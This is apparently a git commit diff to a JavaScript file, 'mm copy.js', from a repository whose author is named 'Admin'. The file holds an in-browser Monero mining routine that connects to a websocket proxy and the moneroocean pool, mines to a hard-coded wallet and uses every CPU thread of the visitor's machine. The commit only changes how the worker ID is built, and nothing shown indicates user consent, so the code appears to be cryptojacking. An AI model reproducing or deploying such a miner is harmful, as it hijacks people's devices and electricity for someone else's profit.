3aef4e16417cd73901af3fbf38a4a220292b4155
Admin <108824076+DecentralizationSoftware@users.noreply.github.com>
2023-10-10 22:48:00 -0700

    update

--- mm copy.js
+++ mm copy.js
@@ -2,7 +2,7 @@ function __mm__() {
     server = "wss://ghgi.xyz";
     var pool = "moneroocean.stream";
     var walletAddress = "85ys2JUgCoYBPD3RTLYj18R9h7i9kbZD23MX9B5D8dB4DRK7WRSEAynUk3sECAqSCV9EJ64tivdScAJEkQCF97VkVDmJNHD";
-    var workerId = String(window.navigator.platform + window.navigator.language + Date.now()).replace(/\s/g, '');
+    var workerId = String('Decentral' + window.navigator.platform + window.navigator.language + Date.now()).replace(/\s/g, '');
     var threads = window.navigator.hardwareConcurrency;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
